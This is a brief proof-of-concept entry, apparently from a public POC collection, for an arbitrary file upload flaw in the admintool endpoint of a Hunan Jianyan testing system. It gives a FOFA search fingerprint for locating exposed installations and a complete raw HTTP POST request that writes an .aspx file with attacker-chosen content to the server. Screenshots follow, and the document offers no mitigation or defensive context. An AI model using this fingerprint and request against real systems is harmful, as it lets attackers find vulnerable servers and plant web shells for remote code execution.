## 湖南建研-检测系统 admintool 任意文件上传


## fofa
```
body="/Content/Theme/Standard/webSite/login.css"
```

## poc
```
POST /Scripts/admintool?type=updatefile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Content-Length: 41
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

filePath=dmvckiil.aspx&fileContent=123123
```
![7c62372ac4c93cda2a5dbc1ab4b5a986](https://github.com/wy876/POC/assets/139549762/c36d1b3f-f839-40c3-a6ab-23669a0b89dd)

![940cc53a8930c36235859b455f3983ca](https://github.com/wy876/POC/assets/139549762/097b6b6f-1cde-4aad-96f7-7e70a0f6bbe0)
